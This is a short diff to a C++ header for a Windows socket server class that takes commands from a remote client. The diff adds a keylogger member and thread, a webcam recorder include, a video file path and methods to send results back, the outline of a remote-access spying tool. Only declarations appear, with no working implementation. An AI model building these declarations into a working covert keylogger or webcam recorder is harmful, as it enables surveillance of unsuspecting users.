@@ -3,12 +3,14 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <thread>
 #include <iostream>
 #include <string>
 #include "keylogger.h"
 #include "PowerRelatedFunction.h"
 #include "process_manager.h"
 #include "copyfile.h"
+#include "WebcamRecorder.h"
 #pragma comment(lib, "ws2_32.lib")
 
 class Server
@@ -24,6 +26,11 @@ public:
     const char *PORT = "27015";
     const int BUFSIZE = 512;
 
+    keylogger keylog;
+    std::thread keyLogThread;
+
+    std::string videoFilePath;
+
     Server(std::string _port)
     {
         if (_port.empty())
@@ -31,9 +38,12 @@ public:
             port = PORT;
         }
     }
-
+    Server();
     void Init();
-    void GetCommandFromClient();
+    bool WaitForConnection();
+    bool GetCommandFromClient();
     void ProcessCommand();
+    void SendResult(std::string path);
+    void DisconnectClient();
     void Shutdown();
 };
